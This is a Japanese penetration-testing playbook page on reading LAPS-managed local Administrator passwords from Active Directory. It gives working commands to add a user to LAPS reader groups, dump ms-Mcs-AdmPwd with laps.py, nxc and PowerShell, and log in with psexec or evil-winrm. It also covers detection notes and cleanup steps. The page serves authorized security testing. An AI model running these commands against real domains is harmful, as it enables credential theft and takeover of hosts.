# LAPS 管理者パスワードの取得

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LAPS パスワード読み取りは監査ログに残る）
>
> 実施可否は事前合意で明示確認すること。演習環境では制約なし。

## 概要

LAPS（Local Administrator Password Solution）は Microsoft 公式の仕組みで、ドメイン参加済みコンピューターのローカル Administrator パスワードを自動ローテーションし、AD の `ms-Mcs-AdmPwd` 属性に格納する。この属性を読み取れる権限を持つユーザー（LAPS Readers グループ等）になれれば、ローカル Administrator の平文パスワードが取得できる。

**攻撃者の思考トレース：** LAPS が導入されていれば、DC にローカル管理者パスワードが集中管理されている。「LAPS ADM / LAPS READ グループにメンバー追加できる」権限チェーンをたどることで、最終的にホストの Administrator パスワードを取得できる。

---

## 着火条件

以下のいずれかが確認できた場合：

- BloodHound で、現在のユーザーが `LAPS Readers` / `LAPS ADM` 等の LAPS 読み取りグループに属している
- BloodHound / PowerShell で、現在のユーザーがそのグループに自分を追加できる権限（GenericAll / ForcePasswordChange 等）を持っている
- `Get-ADComputer` や `ldapsearch` で `ms-Mcs-AdmPwd` 属性が返ってくる

---

## 観点・着眼点

**先に確認すること：** LAPS が環境に導入されているかを先に確認する。

```powershell
# [Target] LAPS が導入されているか確認（ms-Mcs-AdmPwd 属性の存在確認）
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }
# → 属性が返ってきたら LAPS 導入済み
```

**何が出たら次に何をするか：**

| 状況 | 次のアクション |
|------|--------------|
| LAPS パスワードが取得できた | そのパスワードで Administrator として psexec / evil-winrm でアクセス |
| 読み取りグループに自分を追加できる権限がある | グループ追加 → LAPS パスワード読み取り |
| `ms-Mcs-AdmPwd` が空（null）| そのコンピューターは LAPS 管理外（手動管理または未設定）|
| アクセス拒否 | 現在のユーザーに読み取り権限がない → グループ追加できる ACE を BloodHound で探す |

---

## 手順

### Step 1: LAPS 読み取りグループへの自分の追加（権限がある場合）

```powershell
# [Target] PowerShell でグループに自分（または別のユーザー）を追加する
# $cred は操作可能な認証情報オブジェクト（ForcePasswordChange で取得したもの等）
Add-ADGroupMember -Identity 'LAPS Read' -Members [USER] -Credential $cred
Add-ADGroupMember -Identity 'LAPS ADM'  -Members [USER] -Credential $cred

# グループメンバーシップの確認
net user [USER] /domain | findstr /i "local"
```

> グループ名は環境によって異なる（`LAPS Readers`・`LAPS Read`・`LAPS_ADM` 等）。BloodHound で LAPS 関連グループのノードを確認する。

### Step 2: LAPS パスワードの取得

**方法A: laps.py（Impacket ベース、Linux 側から）**

```bash
# [Attacker] laps.py でターゲットホストの Administrator パスワードを取得
# laps.py は Impacket に同梱されていない場合もある → pip install laps.py または GitHub から取得
python3 laps.py \
  -u '[USER]' \
  -p '[PASSWORD]' \
  -d [DOMAIN] \
  -l [TARGET_FQDN]
# → "Password: [PLAINTEXT_ADMIN_PASSWORD]" が出力される
```

**方法B: nxc（NetExec）でダンプ**

```bash
# [Attacker] nxc でドメイン内の全ホストの LAPS パスワードを取得
nxc ldap [DC_IP] -u '[USER]' -p '[PASSWORD]' --laps
# → 各ホスト名と Administrator パスワードが一覧で出力される
```

**方法C: PowerShell（ターゲット内部から）**

```powershell
# [Target] LAPS パスワードの読み取り
Get-ADComputer [COMPUTERNAME] -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd

# またはドメイン内全コンピューターの LAPS パスワードを一覧で確認
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Select-Object Name, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }
```

### Step 3: 取得したパスワードでアクセス

```bash
# [Attacker] psexec で Administrator として接続
psexec.py [DOMAIN]/[ADMIN_USER]@[TARGET_IP]
# → パスワードプロンプトで LAPS パスワードを入力

# または evil-winrm
evil-winrm -i [TARGET_IP] -u [ADMIN_USER] -p '[LAPS_PASSWORD]'
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `ms-Mcs-AdmPwd` が返ってこない | LAPS 未導入。または読み取り権限がない → BloodHound で権限チェーンを確認 |
| グループ追加後もパスワードが読めない | セッションを更新してグループメンバーシップを再読み込みする（PSSession の再接続）|
| `laps.py` が見つからない | `pip install laps.py --break-system-packages` または `nxc --laps` で代替 |
| 取得したパスワードで Administrator としてアクセスできない | ローカル Admin が無効化されている可能性。`net localgroup Administrators` で確認 |

---

## 注意点・落とし穴

- LAPS パスワードは定期ローテーション（通常 30 日）されるため、取得後は速やかに使用する
- グループ追加後、現在の PSSession のグループメンバーシップはリフレッシュされない。新しいセッションを開くか PSSession を再作成する必要がある
- LAPS の読み取り対象は「コンピューターのローカル Administrator」。ドメイン管理者アカウントとは別物

---

## 昇格成功後に確認すること（横展開観点）

Administrator として接続できたら：

- `whoami /priv` で SeDebugPrivilege 等の特権トークンを確認
- `net user Administrator` でアカウント状態を確認
- DCSync が必要な場合は → `../Credential_Dumping.md`
- 他ホストへの同じ LAPS 読み取りを展開する場合は BloodHound で他コンピューターの ACL を確認

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ローカル管理者パスワードの取得はシステムへの完全アクセスを意味する
- **想定されるSIEM/EDR検知**: LAPS 属性読み取りの監査ログ（AD 監査設定が有効な場合）
- **業務影響リスク**: なし（読み取りのみ。パスワード変更はしない）
- **原状回復必須項目**:
  - ✅ 追加したグループメンバーシップを削除（`Remove-ADGroupMember`）
  - ✅ 取得した Administrator パスワードは暗号化保管 → 案件終了時破棄
- **演習環境での扱い**: 制約なし

---

## 関連技術

- 前：BloodHound で LAPS 読み取りグループへのアクセス権限を確認 → `../05_Tools_Reference/BloodHound.md`
- 前：ForcePasswordChange / GenericAll でユーザーを乗っ取り → LAPS グループに追加 → `./ACE_Abuse/ForcePasswordChange.md` / `./ACE_Abuse/GenericAll.md`
- 後：Administrator として DCSync → `./Credential_Dumping.md`
- 後：psexec での接続 → `../05_Tools_Reference/Impacket_Suite.md`
